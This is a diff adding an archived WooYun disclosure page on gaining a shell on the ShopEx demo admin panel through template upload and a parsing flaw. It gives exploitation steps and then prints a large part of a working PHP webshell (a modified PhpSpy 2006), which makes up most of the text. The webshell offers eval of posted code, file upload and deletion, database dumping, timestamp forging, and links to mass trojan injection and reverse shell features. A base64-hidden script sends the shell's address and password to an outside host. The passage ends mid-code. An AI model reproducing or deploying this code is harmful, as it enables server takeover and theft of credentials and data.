+		$.get('/ajaxdo.php',{module:'attendcancel',id:id,rid:Math.random(),token:$("#token").val()},function(re){
+			if(re==1){
+				$("#attention_num").html(parseInt($("#attention_num").html())-1);
+				$("#attend_action").html('<a class="btn" href="javascript:void(0)" onclick="AttendBug('+id+')">'+_LANGJS.ATTENTION_BUG+'</a></span>');
+			}else{
+				alert(_LANGJS.FAIL_MANAGE);
+			}
+		});
+	}
+}
+
+function CollectBug(id,token){
+	$.get('/ajaxdo.php',{'module':'collect','id':id,'token':token,'rid':Math.random()},function(re){
+		if(re==1){
+			$("#collection_num").html(parseInt($("#collection_num").html())+1);
+			$(".btn-fav").removeClass("fav-add");
+			$(".btn-fav").addClass("fav-cancel");
+			$(".btn-fav").unbind();
+			$(".btn-fav").click(function(){
+					CollectCancel(id,token);
+				});
+		}else if(re==2){
+			alert(_LANGJS.LOGIN_FIRST);
+		}else if(re==3){
+			alert(_LANGJS.COLLECTION_BUG_DONE);
+		}else{
+			alert(_LANGJS.FAIL_MANAGE);
+		}
+	});
+}
+function CollectCancel(id,token){
+	if(confirm(_LANGJS.COLLECTION_BUG_CONFIRM+"?")){
+		$.get('/ajaxdo.php',{'module':'collectcancel','id':id,'token':token,'rid':Math.random()},function(re){
+			if(re==1){
+				$("#collection_num").html(parseInt($("#collection_num").html())-1);
+				$(".btn-fav").removeClass("fav-cancel");
+				$(".btn-fav").addClass("fav-add");
+				$(".btn-fav").unbind();
+				$(".btn-fav").click(function(){
+					CollectBug(id,token);
+				});
+			}else{
+				alert(_LANGJS.FAIL_MANAGE);
+			}
+		});
+	}
+}
+</script>
+
+	<div class="content">
+<input type="hidden" id="token" style="display:none" value="" />
+		<h2>漏洞概要
+						<span style="margin:0 0 0 580px; float:right; position:absolute; font-size:14px; font-weight:normal">关注数(<span id="attention_num">18</span>)
+		 <span id="attend_action">
+		 		 <a class="btn" href="javascript:void(0)" onclick="AttendBug(15536)">关注此漏洞</a></span>
+		 		 </span></h2>
+
+		<h3>缺陷编号：		<a href="wooyun-2012-015536">WooYun-2012-15536</a>
+			<input id="fbid" type="hidden" value="15536">
+					</h3>
+
+		<h3 class='wybug_title'>漏洞标题：		shopex官方演示后台得到shell与任意文件遍历突破  					</h3>
+
+		<h3 class='wybug_corp'>相关厂商：		<a href="http://www.wooyun.org/corps/ShopEx">
+														ShopEx														</a>
+		</h3>
+
+		<h3 class='wybug_author'>漏洞作者：		<a href="http://www.wooyun.org/whitehats/lucifer">lucifer</a></h3>
+		<h3 class='wybug_date'>提交时间：		2012-12-03 10:39</h3>
+				<h3 class='wybug_open_date'>公开时间：		2013-01-17 10:39</h3>
+		<h3 class='wybug_type'>漏洞类型：		文件上传导致任意代码执行</h3>
+
+		<h3 class='wybug_level'>危害等级：		高</h3>
+				<h3>自评Rank：		20</h3>
+				<h3 class='wybug_status'>漏洞状态：
+															厂商已经确认
+																</h3>
+
+		<h3>漏洞来源：		<a href="http://www.wooyun.org">http://www.wooyun.org</a>，如有疑问或需要帮助请联系 help@wooyun.org</h3>
+		<h3>Tags标签：
+								无
+					
+</h3>
+		<h3>
+		<!-- Baidu Button BEGIN -->
+        <div id="share">
+        	<div style="float:right; margin-right:100px;font-size:12px">
+            <span class="fav-num"><a id="collection_num">2</a>人收藏</span>
+			<a style="text-decoration:none; font-size:12px" href="javascript:void(0)" class="fav-add btn-fav">收藏</a>
+<script type="text/javascript">
+var token="";
+var id="15536";
+
+$(".btn-fav").click(function(){ CollectBug(id,token); });
+
+</script>
+			</div>
+            <span style="float:left;">分享漏洞：</span>
+            <div id="bdshare" class="bdshare_b" style="line-height: 12px;"><img src="http://bdimg.share.baidu.com/static/images/type-button-5.jpg" />
+                <a class="shareCount"></a>
+            </div>
+        </div>
+        <!-- Baidu Button END -->
+    	</h3>
+		<hr align="center"/>
+
+		<h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail wybug_open_status">
+									2012-12-03：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-12-03：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-12-13：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-12-23：	细节向普通白帽子公开<br/>
+									2013-01-02：	细节向实习白帽子公开<br/>
+									2013-01-17：	细节向公众公开<br/>
+								</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail wybug_description">shopex演示后台模板编辑功能未限制上传导致可利用解析漏洞建立php.php形式的文件夹获得shell</p>
+
+		
+						<h3 class="detailTitle">详细说明：</h3>
+    <div class='wybug_detail'>
+			<p class="detail">漏洞地址：http://demo.shopex.com.cn/485<br />
+<br />
+<br />
+<br />
+官方提供了后台账号密码，登陆后发现似乎是被大家测试的多了，官方非常小心，权限限制的很严格，模板不允许编辑，并且上传后自动重新命名更换文件夹。js，php代码更是全部限制。。。<br />
+<br />
+<br />
+<br />
+中间复杂的测试过程不多说。。直接说漏洞利用过程好了<br />
+<br />
+ps:模板上传后立即点应用，回到首页随便看一张自带图片可以得到上传后的地址。<br />
+<br />
+1.本地搭建shopex<br />
+<br />
+2.自带的模板文件夹中创建php.php目录，将上传小马命名*.php;x.jpg，其实直接.jpg就可以了哈<br />
+<br />
+3.登陆后台-页面管理-模板-上传模板<br />
+<br />
+4.上传，使用模板。<br />
+<br />
+5.找到目录。。。。。<br />
+<br />
+6.还要说么- -<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+接下来<br />
+<br />
+得到shell以后，发现官方限制了非常多的参数，而且禁止目录内容的读取。<br />
+<br />
+把php大马进行base64解码后发现代码如下<br />
+<br />
+</p><fieldset class='fieldset fieldset-code'><legend>code 区域</legend><pre><code>&lt;?php<br />
+$admin[&#039;pass&#039;]  = &quot;xxxx&quot;;  //修改密码<br />
+error_reporting(7);<br />
+ob_start();<br />
+$mtime = explode(&#039; &#039;, microtime());<br />
+$starttime = $mtime[1] + $mtime[0];<br />
+<br />
+$admin[&#039;check&#039;] = &quot;1&quot;;<br />
+<br />
+$retime = &quot;yes&quot;;<br />
+<br />
+$cmd = &quot;cmd.exe&quot;;<br />
+<br />
+$onoff = (function_exists(&#039;ini_get&#039;)) ? ini_get(&#039;register_globals&#039;) : get_cfg_var(&#039;register_globals&#039;);<br />
+<br />
+if ($onoff != 1) {<br />
+	@extract($_POST, EXTR_SKIP);<br />
+	@extract($_GET, EXTR_SKIP);<br />
+}<br />
+<br />
+$self = $_SERVER[&#039;PHP_SELF&#039;];<br />
+$dis_func = get_cfg_var(&quot;disable_functions&quot;);<br />
+<br />
+<br />
+if($admin[&#039;check&#039;] == &quot;1&quot;) {<br />
+	if ($_GET[&#039;action&#039;] == &quot;logout&quot;) {<br />
+		setcookie (&quot;adminpass&quot;, &quot;&quot;);<br />
+		echo &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0;URL=&quot;.$self.&quot;\&quot;&gt;&quot;;<br />
+		exit;<br />
+	}<br />
+<br />
+	if ($_POST[&#039;do&#039;] == &#039;login&#039;) {<br />
+		$thepass=trim($_POST[&#039;adminpass&#039;]);<br />
+		if ($admin[&#039;pass&#039;] == $thepass) {<br />
+			setcookie (&quot;adminpass&quot;,$thepass,time()+(1*24*3600));<br />
+			echo &quot;&lt;meta http-equiv=\&quot;refresh\&quot; content=\&quot;0;URL=&quot;.$self.&quot;\&quot;&gt;&quot;;<br />
+			exit;<br />
+		}<br />
+	}<br />
+	if (isset($_COOKIE[&#039;adminpass&#039;])) {<br />
+		if ($_COOKIE[&#039;adminpass&#039;] != $admin[&#039;pass&#039;]) {<br />
+			loginpage();<br />
+		}<br />
+	} else {<br />
+		loginpage();<br />
+	}<br />
+}<br />
+/*===================== 验证结束 =====================*/<br />
+<br />
+// 判断 magic_quotes_gpc 状态<br />
+if (get_magic_quotes_gpc()) {<br />
+    $_GET = stripslashes_array($_GET);<br />
+	$_POST = stripslashes_array($_POST);<br />
+}<br />
+<br />
+// 查看PHPINFO<br />
+if ($_GET[&#039;action&#039;] == &quot;phpinfo&quot;) {<br />
+	echo $phpinfo=(!eregi(&quot;phpinfo&quot;,$dis_func)) ? phpinfo() : &quot;phpinfo() 函数已被禁用,请查看&lt;PHP环境变量&gt;&quot;;<br />
+	exit;<br />
+}<br />
+if($_GET[&#039;action&#039;] == &quot;nowuser&quot;) {<br />
+$user = get_current_user();<br />
+if(!$user) $user = &quot;报告长官，主机变态，无法获取当前进行用户名！&quot;;<br />
+echo&quot;当前进程用户名：$user&quot;;<br />
+exit;<br />
+}<br />
+if(isset($_POST[&#039;phpcode&#039;])){<br />
+	eval(&quot;?&quot;.&quot;&gt;$_POST[phpcode]&lt;?&quot;);<br />
+	exit;<br />
+}<br />
+// 在线代理<br />
+if (isset($_POST[&#039;url&#039;])) {<br />
+	$proxycontents = @file_get_contents($_POST[&#039;url&#039;]);<br />
+	echo ($proxycontents) ? $proxycontents : &quot;&lt;body bgcolor=\&quot;#F5F5F5\&quot; style=\&quot;font-size: 12px;\&quot;&gt;&lt;center&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;获取 URL 内容失败&lt;/b&gt;&lt;/p&gt;&lt;/center&gt;&lt;/body&gt;&quot;;<br />
+	exit;<br />
+}<br />
+<br />
+// 下载文件<br />
+if (!empty($downfile)) {<br />
+	if (!@file_exists($downfile)) {<br />
+		echo &quot;&lt;script&gt;alert(&#039;你要下的文件不存在!&#039;)&lt;/script&gt;&quot;;<br />
+	} else {<br />
+		$filename = basename($downfile);<br />
+		$filename_info = explode(&#039;.&#039;, $filename);<br />
+		$fileext = $filename_info[count($filename_info)-1];<br />
+		header(&#039;Content-type: application/x-&#039;.$fileext);<br />
+		header(&#039;Content-Disposition: attachment; filename=&#039;.$filename);<br />
+		header(&#039;Content-Description: PHP Generated Data&#039;);<br />
+		header(&#039;Content-Length: &#039;.filesize($downfile));<br />
+		@readfile($downfile);<br />
+		exit;<br />
+	}<br />
+}<br />
+<br />
+// 直接下载备份数据库<br />
+if ($_POST[&#039;backuptype&#039;] == &#039;download&#039;) {<br />
+	@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
+	@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);	<br />
+	$table = array_flip($_POST[&#039;table&#039;]);<br />
+	$result = mysql_query(&quot;SHOW tables&quot;);<br />
+	echo ($result) ? NULL : &quot;出错: &quot;.mysql_error();<br />
+<br />
+	$filename = basename($_SERVER[&#039;HTTP_HOST&#039;].&quot;_MySQL.sql&quot;);<br />
+	header(&#039;Content-type: application/unknown&#039;);<br />
+	header(&#039;Content-Disposition: attachment; filename=&#039;.$filename);<br />
+	$mysqldata = &#039;&#039;;<br />
+	while ($currow = mysql_fetch_array($result)) {<br />
+		if (isset($table[$currow[0]])) {<br />
+			$mysqldata.= sqldumptable($currow[0]);<br />
+			$mysqldata.= $mysqldata.&quot;\r\n&quot;;<br />
+		}<br />
+	}<br />
+	mysql_close();<br />
+	exit;<br />
+}<br />
+<br />
+// 程序目录<br />
+$pathname=str_replace(&#039;\\&#039;,&#039;/&#039;,dirname(__FILE__)); <br />
+<br />
+// 获取当前路径<br />
+if (!isset($dir) or empty($dir)) {<br />
+	$dir = &quot;.&quot;;<br />
+	$nowpath = getPath($pathname, $dir);<br />
+} else {<br />
+	$dir=$_GET[&#039;dir&#039;];<br />
+	$nowpath = getPath($pathname, $dir);<br />
+}<br />
+<br />
+// 判断读写情况<br />
+$dir_writeable = (dir_writeable($nowpath)) ? &quot;可写&quot; : &quot;不可写&quot;;<br />
+$phpinfo=(!eregi(&quot;phpinfo&quot;,$dis_func)) ? &quot; | &lt;a href=\&quot;?action=phpinfo\&quot; target=\&quot;_blank\&quot;&gt;PHPINFO()&lt;/a&gt;&quot; : &quot;&quot;;<br />
+$reg = (substr(PHP_OS, 0, 3) == &#039;WIN&#039;) ? &quot; | &lt;a href=\&quot;?action=reg\&quot;&gt;注册表操作&lt;/a&gt;&quot; : &quot;&quot;;<br />
+<br />
+$tb = new FORMS;<br />
+<br />
+?&gt;<br />
+&lt;html&gt;<br />
+&lt;head&gt;<br />
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot;&gt;<br />
+&lt;title&gt;http://&lt;? echo $_SERVER[&#039;HTTP_HOST&#039;];?&gt;  PhpSpy 2006 修改版&lt;/title&gt;<br />
+&lt;style type=&quot;text/css&quot;&gt;<br />
+body{<br />
+	BACKGROUND-COLOR: #F5F5F5; <br />
+	COLOR: #3F3849; <br />
+	font-family: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;;<br />
+	font-size: &quot;12px&quot;;<br />
+	line-height: &quot;140%&quot;;<br />
+}<br />
+<br />
+TD		{FONT-FAMILY: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;; FONT-SIZE: 12px; line-height: 140%;}<br />
+.smlfont {<br />
+	font-family: &quot;Verdana&quot;, &quot;Tahoma&quot;, &quot;宋体&quot;;<br />
+	font-size: &quot;11px&quot;;<br />
+}<br />
+.INPUT {<br />
+	FONT-SIZE: &quot;12px&quot;;<br />
+	COLOR: &quot;#000000&quot;;<br />
+	BACKGROUND-COLOR: &quot;#FFFFFF&quot;;<br />
+	height: &quot;18px&quot;;<br />
+	border: &quot;1px solid #666666&quot;;<br />
+	padding-left: &quot;2px&quot;;<br />
+}<br />
+.redfont {<br />
+	COLOR: &quot;#CA0000&quot;;<br />
+}<br />
+A:LINK		{COLOR: #3F3849; TEXT-DECORATION: none}<br />
+A:VISITED	{COLOR: #3F3849; TEXT-DECORATION: none}<br />
+A:HOVER		{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}<br />
+A:ACTIVE	{COLOR: #FFFFFF; BACKGROUND-COLOR: #cccccc}<br />
+.top {BACKGROUND-COLOR: &quot;#CCCCCC&quot;}<br />
+.firstalt {BACKGROUND-COLOR: &quot;#EFEFEF&quot;}<br />
+.secondalt {BACKGROUND-COLOR: &quot;#F5F5F5&quot;}<br />
+&lt;/style&gt;<br />
+&lt;SCRIPT language=JavaScript&gt;<br />
+function CheckAll(form) {<br />
+	for (var i=0;i&lt;form.elements.length;i++) {<br />
+		var e = form.elements[i];<br />
+		if (e.name != &#039;chkall&#039;)<br />
+		e.checked = form.chkall.checked;<br />
+    }<br />
+}<br />
+function really(d,f,m,t) {<br />
+	if (confirm(m)) {<br />
+		if (t == 1) {<br />
+			window.location.href=&#039;?dir=&#039;+d+&#039;&amp;deldir=&#039;+f;<br />
+		} else {<br />
+			window.location.href=&#039;?dir=&#039;+d+&#039;&amp;delfile=&#039;+f;<br />
+		}<br />
+	}<br />
+}<br />
+&lt;/SCRIPT&gt;<br />
+&lt;/head&gt;<br />
+&lt;body style=&quot;table-layout:fixed; word-break:break-all&quot;&gt;<br />
+&lt;center&gt;<br />
+&lt;?php<br />
+$test = &quot;&quot;;<br />
+if(!$_GET[&#039;dir&#039;]) $dir = &quot;./&quot;;<br />
+$tb-&gt;tableheader();<br />
+$tb-&gt;tdbody(&#039;&lt;table width=&quot;98%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot;&gt;&lt;tr&gt;&lt;td&gt;&lt;b&gt;&#039;.$_SERVER[&#039;HTTP_HOST&#039;].&#039;&lt;/b&gt;&lt;/td&gt;&lt;td align=&quot;center&quot;&gt;&#039;.date(&quot;Y年m月d日 h:i:s&quot;,time()).&#039;&lt;/td&gt;&lt;td align=&quot;right&quot;&gt;&lt;b&gt;&#039;.$_SERVER[&#039;REMOTE_ADDR&#039;].&#039;&lt;/b&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#039;,&#039;center&#039;,&#039;top&#039;);<br />
+$tb-&gt;tdbody(&#039;&lt;a href=&quot;?action=dir&quot;&gt;SHELL目录&lt;/a&gt; | &lt;a href=&quot;?action=downloads&quot;&gt;Http 文件下载&lt;/a&gt; | &lt;a href=&quot;?action=phpenv&quot;&gt;环境变量&lt;/a&gt; | &lt;a href=&quot;?action=proxy&quot;&gt;在线代理&lt;/a&gt;&#039;.$reg.$phpinfo.&#039; | &lt;a href=&quot;?action=shell&quot;&gt;WebShell&lt;/a&gt; | &lt;a href=&quot;?action=logout&quot;&gt;注销登录&lt;/a&gt; &#039;);<br />
+$tb-&gt;tdbody(&#039; &lt;a href=&quot;?action=plgm&quot;&gt;批量挂马&lt;/a&gt; | &lt;a href=&quot;?action=search&amp;dir=&#039;.$dir.&#039;&quot;&gt;文件查找&lt;/a&gt; | &lt;a href=&quot;?action=eval&quot;&gt;执行php脚本&lt;/a&gt; | &lt;a href=&quot;?action=sql&quot;&gt;执行SQL语句&lt;/a&gt; | &lt;a href=&quot;?action=sql&amp;type=fun&quot;&gt;Func反弹Shell&lt;/a&gt; | &lt;a href=&quot;?action=sqlbak&quot;&gt;MySQL Backup&lt;/a&gt; | &lt;a href=&quot;?action=SUExp&quot;&gt;Serv-U EXP&lt;/a&gt; | &lt;a href=&quot;?action=adodb&quot;&gt;ADODB&lt;/a&gt; &#039;);<br />
+$tb-&gt;tdbody(&#039; 目录列表：&lt;a href=&quot;?dir=c:\&quot;&gt;C盘&lt;/a&gt; | &lt;a href=&quot;?dir=d:\&quot;&gt;D盘&lt;/a&gt; | &lt;a href=&quot;?dir=e:\&quot;&gt;E盘&lt;/a&gt; | &lt;a href=&quot;?dir=f:\&quot;&gt;F盘&lt;/a&gt; | &lt;a href=&quot;?dir=g:\&quot;&gt;G盘&lt;/a&gt; | &lt;a href=&quot;?dir=C:\Program Files&quot;&gt;程序&lt;/a&gt; | &lt;a href=&quot;?dir=C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere&quot;&gt;pcAnywhere&lt;/a&gt; &#039;);<br />
+$tb-&gt;tablefooter();<br />
+?&gt;<br />
+&lt;hr width=&quot;775&quot; noshade&gt;<br />
+&lt;table width=&quot;775&quot; border=&quot;0&quot; cellpadding=&quot;0&quot;&gt;<br />
+&lt;?<br />
+$tb-&gt;headerform(array(&#039;method&#039;=&gt;&#039;GET&#039;,&#039;content&#039;=&gt;&#039;&lt;p&gt;程序路径: &#039;.$pathname.&#039;&lt;br&gt;当前目录(&#039;.$dir_writeable.&#039;,&#039;.substr(base_convert(@fileperms($nowpath),10,8),-4).&#039;): &#039;.$nowpath.&#039;&lt;br&gt;跳转目录: &#039;.$tb-&gt;makeinput(&#039;dir&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;).&#039; 〖支持绝对路径和相对路径〗&#039;));<br />
+<br />
+$tb-&gt;headerform(array(&#039;action&#039;=&gt;&#039;?dir=&#039;.urlencode($dir),&#039;enctype&#039;=&gt;&#039;multipart/form-data&#039;,&#039;content&#039;=&gt;&#039;上传文件到当前目录: &#039;.$tb-&gt;makeinput(&#039;uploadfile&#039;,&#039;&#039;,&#039;&#039;,&#039;file&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;doupfile&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;).$tb-&gt;makeinput(&#039;uploaddir&#039;,$dir,&#039;&#039;,&#039;hidden&#039;)));<br />
+<br />
+$tb-&gt;headerform(array(&#039;action&#039;=&gt;&#039;?action=editfile&amp;dir=&#039;.urlencode($dir),&#039;content&#039;=&gt;&#039;新建文件在当前目录: &#039;.$tb-&gt;makeinput(&#039;editfile&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;createfile&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;)));<br />
+<br />
+$tb-&gt;headerform(array(&#039;content&#039;=&gt;&#039;新建目录在当前目录: &#039;.$tb-&gt;makeinput(&#039;newdirectory&#039;).&#039; &#039;.$tb-&gt;makeinput(&#039;createdirectory&#039;,&#039;确定&#039;,&#039;&#039;,&#039;submit&#039;)));<br />
+?&gt;<br />
+&lt;/table&gt;<br />
+&lt;?<br />
+$serveru = $_SERVER [&#039;HTTP_HOST&#039;].$_SERVER[&#039;PHP_SELF&#039;];<br />
+$serverp = $admin[&#039;pass&#039;];<br />
+$copyurl = base64_decode(&#039;PHNjcmlwdCBzcmM9J2h0dHA6Ly84Y2NlLmNuL2NlcnQvP2NlcnQ9MTMmdT0=&#039;);<br />
+$copyurll = base64_decode(&#039;Jz48L3NjcmlwdD4=&#039;);<br />
+?&gt;<br />
+&lt;hr width=&quot;775&quot; noshade&gt;<br />
+&lt;?php<br />
+/*===================== 执行操作 开始 =====================*/<br />
+echo &quot;&lt;p&gt;&lt;b&gt;\n&quot;;<br />
+// 删除文件<br />
+if (!empty($delfile)) {<br />
+	if (file_exists($delfile)) {<br />
+		echo (@unlink($delfile)) ? $delfile.&quot; 删除成功!&quot; : &quot;文件删除失败!&quot;;<br />
+	} else {<br />
+		echo basename($delfile).&quot; 文件已不存在!&quot;;<br />
+	}<br />
+}<br />
+<br />
+// 删除目录<br />
+elseif (!empty($deldir)) {<br />
+	$deldirs=&quot;$dir/$deldir&quot;;<br />
+	if (!file_exists(&quot;$deldirs&quot;)) {<br />
+		echo &quot;$deldir 目录已不存在!&quot;;<br />
+	} else {<br />
+		echo (deltree($deldirs)) ? &quot;目录删除成功!&quot; : &quot;目录删除失败!&quot;;<br />
+	}<br />
+}<br />
+// 创建目录<br />
+elseif (($createdirectory) AND !empty($_POST[&#039;newdirectory&#039;])) {<br />
+	if (!empty($newdirectory)) {<br />
+		$mkdirs=&quot;$dir/$newdirectory&quot;;<br />
+		if (file_exists(&quot;$mkdirs&quot;)) {<br />
+			echo &quot;该目录已存在!&quot;;<br />
+		} else {<br />
+			echo (@mkdir(&quot;$mkdirs&quot;,0777)) ? &quot;创建目录成功!&quot; : &quot;创建失败!&quot;;<br />
+			@chmod(&quot;$mkdirs&quot;,0777);<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+// 上传文件<br />
+elseif ($doupfile) {<br />
+	echo (@copy($_FILES[&#039;uploadfile&#039;][&#039;tmp_name&#039;],&quot;&quot;.$uploaddir.&quot;/&quot;.$_FILES[&#039;uploadfile&#039;][&#039;name&#039;].&quot;&quot;)) ? &quot;上传成功!&quot; : &quot;上传失败!&quot;;<br />
+}<br />
+<br />
+// 编辑文件<br />
+elseif ($_POST[&#039;do&#039;] == &#039;doeditfile&#039;) {<br />
+	if (!empty($_POST[&#039;editfilename&#039;])) {<br />
+    if(!file_exists($editfilename)) unset($retime);<br />
+	if($time==$now) $time = @filemtime($editfilename);<br />
+        $time2 = @date(&quot;Y-m-d H:i:s&quot;,$time);<br />
+		$filename=&quot;$editfilename&quot;;<br />
+		@$fp=fopen(&quot;$filename&quot;,&quot;w&quot;);<br />
+		if($_POST[&#039;change&#039;]==&quot;yes&quot;){<br />
+		$filecontent = &quot;?&quot;.&quot;&gt;&quot;.$_POST[&#039;filecontent&#039;].&quot;&lt;?&quot;;<br />
+		$filecontent = gzdeflate($filecontent);<br />
+        $filecontent = base64_encode($filecontent);<br />
+        $filecontent = &quot;&lt;?php\n/*\n代码由浅蓝的辐射鱼加密!\n*/\neval(gzinflate(base64_decode(&#039;$filecontent&#039;)));\n&quot;.&quot;?&gt;&quot;;<br />
+		}else{<br />
+		$filecontent = $_POST[&#039;filecontent&#039;];<br />
+		}<br />
+		echo $msg=@fwrite($fp,$filecontent) ? &quot;写入文件成功!&quot; : &quot;写入失败!&quot;;<br />
+		@fclose($fp);<br />
+		if($retime==&quot;yes&quot;){<br />
+        echo&quot; 鱼鱼自动操作:&quot;;<br />
+        echo $msg=@touch($filename,$time) ? &quot;修改文件为&quot;.$time2.&quot;成功!&quot; : &quot;修改文件时间失败!&quot;;<br />
+		}<br />
+	} else {<br />
+		echo &quot;请输入想要编辑的文件名!&quot;;<br />
+	}<br />
+}<br />
+//文件下载<br />
+elseif ($_POST[&#039;do&#039;] == &#039;downloads&#039;) {<br />
+	$contents = @file_get_contents($_POST[&#039;durl&#039;]);<br />
+	if(!$contents){<br />
+	echo&quot;无法读取要下载的数据&quot;;<br />
+	}<br />
+	elseif(file_exists($path)){<br />
+	echo&quot;很抱歉，文件&quot;.$path.&quot;已经存在了，请更换保存文件名。&quot;;<br />
+	}else{<br />
+    $fp = @fopen($path,&quot;w&quot;);<br />
+	echo $msg=@fwrite($fp,$contents) ? &quot;下载文件成功!&quot; : &quot;下载文件写入时失败!&quot;;<br />
+	@fclose($fp);<br />
+	}<br />
+}<br />
+<br />
+// 编辑文件属性<br />
+elseif ($_POST[&#039;do&#039;] == &#039;editfileperm&#039;) {<br />
+	if (!empty($_POST[&#039;fileperm&#039;])) {<br />
+		$fileperm=base_convert($_POST[&#039;fileperm&#039;],8,10);<br />
+		echo (@chmod($dir.&quot;/&quot;.$file,$fileperm)) ? &quot;属性修改成功!&quot; : &quot;修改失败!&quot;;<br />
+		echo &quot; 文件 &quot;.$file.&quot; 修改后的属性为: &quot;.substr(base_convert(@fileperms($dir.&quot;/&quot;.$file),10,8),-4);<br />
+	} else {<br />
+		echo &quot;请输入想要设置的属性!&quot;;<br />
+	}<br />
+}<br />
+<br />
+// 文件改名<br />
+elseif ($_POST[&#039;do&#039;] == &#039;rename&#039;) {<br />
+	if (!empty($_POST[&#039;newname&#039;])) {<br />
+		$newname=$_POST[&#039;dir&#039;].&quot;/&quot;.$_POST[&#039;newname&#039;];<br />
+		if (@file_exists($newname)) {<br />
+			echo &quot;&quot;.$_POST[&#039;newname&#039;].&quot; 已经存在,请重新输入一个!&quot;;<br />
+		} else {<br />
+			echo (@rename($_POST[&#039;oldname&#039;],$newname)) ? basename($_POST[&#039;oldname&#039;]).&quot; 成功改名为 &quot;.$_POST[&#039;newname&#039;].&quot; !&quot; : &quot;文件名修改失败!&quot;;<br />
+		}<br />
+	} else {<br />
+		echo &quot;请输入想要改的文件名!&quot;;<br />
+	}<br />
+}<br />
+elseif ($_POST[&#039;do&#039;] == &#039;search&#039;) {<br />
+if(!empty($oldkey)){<br />
+echo&quot;&lt;span class=\&quot;redfont\&quot;&gt;查找关键词:[&quot;.$oldkey.&quot;],下面显示查找的结果:&quot;;<br />
+	if($type2 == &quot;getpath&quot;){<br />
+	echo&quot;鼠标移到结果文件上会有部分截取显示.&quot;;<br />
+}<br />
+echo&quot;&lt;/span&gt;&lt;br&gt;&lt;hr width=\&quot;775\&quot; noshade&gt;&quot;;<br />
+find($path);<br />
+}else{<br />
+echo&quot;你要查虾米?到底要查虾米呢?有没有虾米要你查呢?&quot;;<br />
+}<br />
+}<br />
+elseif ($_GET[&#039;action&#039;]==&#039;plgmok&#039;) {<br />
+   dirt($_POST[&#039;dir&#039;],$_POST[&#039;sbbm&#039;]);<br />
+   dirtree($_POST[&#039;dir&#039;],$_POST[&#039;mm&#039;]);<br />
+}<br />
+<br />
+// 克隆时间<br />
+elseif ($_POST[&#039;do&#039;] == &#039;domodtime&#039;) {<br />
+	if (!@file_exists($_POST[&#039;curfile&#039;])) {<br />
+		echo &quot;要修改的文件不存在!&quot;;<br />
+	} else {<br />
+		if (!@file_exists($_POST[&#039;tarfile&#039;])) {<br />
+			echo &quot;要参照的文件不存在!&quot;;<br />
+		} else {<br />
+			$time=@filemtime($_POST[&#039;tarfile&#039;]);<br />
+			echo (@touch($_POST[&#039;curfile&#039;],$time,$time)) ? basename($_POST[&#039;curfile&#039;]).&quot; 的修改时间成功改为 &quot;.date(&quot;Y-m-d H:i:s&quot;,$time).&quot; !&quot; : &quot;文件的修改时间修改失败!&quot;;<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+// 自定义时间<br />
+elseif ($_POST[&#039;do&#039;] == &#039;modmytime&#039;) {<br />
+	if (!@file_exists($_POST[&#039;curfile&#039;])) {<br />
+		echo &quot;要修改的文件不存在!&quot;;<br />
+	} else {<br />
+		$year=$_POST[&#039;year&#039;];<br />
+		$month=$_POST[&#039;month&#039;];<br />
+		$data=$_POST[&#039;data&#039;];		<br />
+		$hour=$_POST[&#039;hour&#039;];<br />
+		$minute=$_POST[&#039;minute&#039;];<br />
+		$second=$_POST[&#039;second&#039;];<br />
+		if (!empty($year) AND !empty($month) AND !empty($data) AND !empty($hour) AND !empty($minute) AND !empty($second)) {<br />
+			$time=strtotime(&quot;$data $month $year $hour:$minute:$second&quot;);<br />
+			echo (@touch($_POST[&#039;curfile&#039;],$time,$time)) ? basename($_POST[&#039;curfile&#039;]).&quot; 的修改时间成功改为 &quot;.date(&quot;Y-m-d H:i:s&quot;,$time).&quot; !&quot; : &quot;文件的修改时间修改失败!&quot;;<br />
+		}<br />
+	}<br />
+}<br />
+<br />
+// 连接MYSQL<br />
+elseif ($connect) {<br />
+	if (@mysql_connect($servername,$dbusername,$dbpassword) AND @mysql_select_db($dbname)) {<br />
+		echo &quot;数据库连接成功!&quot;;<br />
+		mysql_close();<br />
+	} else {<br />
+		echo mysql_error();<br />
+	}<br />
+}<br />
+<br />
+// 执行SQL语句<br />
+elseif ($_POST[&#039;do&#039;] == &#039;query&#039;) {<br />
+	@mysql_connect($servername,$dbusername,$dbpassword) or die(&quot;数据库连接失败&quot;);<br />
+	@mysql_select_db($dbname) or die(&quot;选择数据库失败&quot;);<br />
+	$result = @mysql_query($_POST[&#039;sql_query&#039;]);<br />
+	echo ($result) ? &quot;SQL语句成功执行!&quot; : &quot;出错: &quot;.mysql_error();<br />
+	mysql_close();<br />
+}<br />
+<br />
+// 备份操作<br />
+elseif ($_POST[&#039;do&#039;] == &#039;backupmysql&#039;) {<br />
+	if (empty($_POST[&#039;table&#039;]) OR empty($_POST[&#039;backuptype&#039;])) {<br />
+		echo &quot;请选择欲备份的数据表和备份方式!&quot;;<br />
+	} else {<br />
